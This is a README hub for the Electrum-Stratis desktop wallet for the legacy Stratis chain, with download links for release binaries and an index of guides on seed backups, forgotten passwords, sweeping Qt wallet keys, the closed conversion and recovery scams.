![Electrum-Stratis](assets/banner-hub.png)

# Electrum-Stratis recovery guides

<p align="center">Recovery, backups and the Qt wallet bridge</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions and checksums are on the [v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

---

These guides cover the objects that can restore a wallet, and they are written in the order that matters when something has already gone wrong. The seed is the wallet: a phrase written on paper at creation restores the keys on any machine, and the restore flow previews the addresses it derives before it writes anything. The wallet file is a convenience layer that opens with the password you chose, and losing the password leaves a locked box rather than a lost balance.

The Qt wallet is the exception that needs its own path. It stores individually generated keys with no phrase above them, so recovery there means exporting a key and sweeping it into a seed-backed wallet, one address at a time. The conversion window is a separate subject again: it closed, and no amount of tooling reopens a service the operator stopped running.

Each guide states what is possible before it explains how, because the most expensive mistake in this area is spending hours on a method that cannot work. Neither the phrase nor the file can be recovered by anyone else: there is no server holding a copy, no reset link and no support desk with an override, so a backup written today is the only thing that makes tomorrow's restore possible.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/seed-file-and-password-backups.md) | three backups |
| [Forgot the wallet password but still have the seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/forgot-password-but-have-the-seed.md) | restore path |
| [dumpprivkey to Sweep: moving coins out of the Qt wallet, in order](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/export-a-key-and-sweep-it.md) | dumpprivkey order |

</div>


## Backups and the seed

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/seed-file-and-password-backups.md) | three backups |
| [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/is-the-seed-enough-to-restore.md) | what a phrase covers |
| [The .dat file that is not in your Electrum Stratis folder](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/wallet-file-not-in-the-folder.md) | file locations |
| [What wallet recovery can and cannot do](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/limits-of-a-restore.md) | what cannot be done |
| [Restore, import or sweep: choosing the right recovery action](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/restore-import-or-sweep.md) | three verbs |

</div>


## Passwords and access

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Forgot the wallet password but still have the seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/forgot-password-but-have-the-seed.md) | restore path |
| [Electrum Stratis password recovery: what is possible and what is not](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/password-cannot-be-recovered.md) | no reset exists |
| [Stratis wallet login pages that do not exist, and what to do instead](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/there-is-no-login-page.md) | no account |
| [Password prompts you cannot satisfy: why they appear and what unlocks them](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/password-prompts-you-never-set.md) | prompt meanings |

</div>


## The Qt wallet

<div align="center">

| Guide | What it answers |
| --- | --- |
| [The Qt wallet does not work with a seed: moving STRAT into Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/qt-wallet-has-no-seed.md) | key-based wallet |
| [dumpprivkey to Sweep: moving coins out of the Qt wallet, in order](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/export-a-key-and-sweep-it.md) | dumpprivkey order |
| [Coins sent to Core 2.2.1: what the balance is waiting for](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/coins-sent-to-core-wallet.md) | full node waiting |
| [Why not just use the native wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/why-not-use-the-native-wallet.md) | two designs |

</div>


## The closed conversion

<div align="center">

| Guide | What it answers |
| --- | --- |
| [The swap is closed: what that means for coins still held](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/the-conversion-window-is-closed.md) | closed service |
| [1:10, off-chain, and the CSV that confirmed it](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/the-fixed-conversion-ratio.md) | record, not rate |
| [There is no page for swapping with an old seed, because it never existed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/no-conversion-needed-a-seed.md) | the missing page |

</div>


## Offers, paper wallets and dead ends

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Crypto recovery scams: what no app, service or DM can do](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/paid-services-that-promise-funds-back.md) | why the offer is the fraud |
| [The paper wallet that could not be swept](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/paper-wallet-that-cannot-be-swept.md) | printouts |

</div>


## More guides

- [Electrum-Stratis guides](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/README.md)
- [Electrum-Stratis wallet fixes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/README.md)

## About

Electrum-Stratis is a self-custody desktop wallet for the legacy Stratis chain, forked from Electrum and released under the MIT licence.

MIT licensed. No page in this repository asks for a seed or a private key.
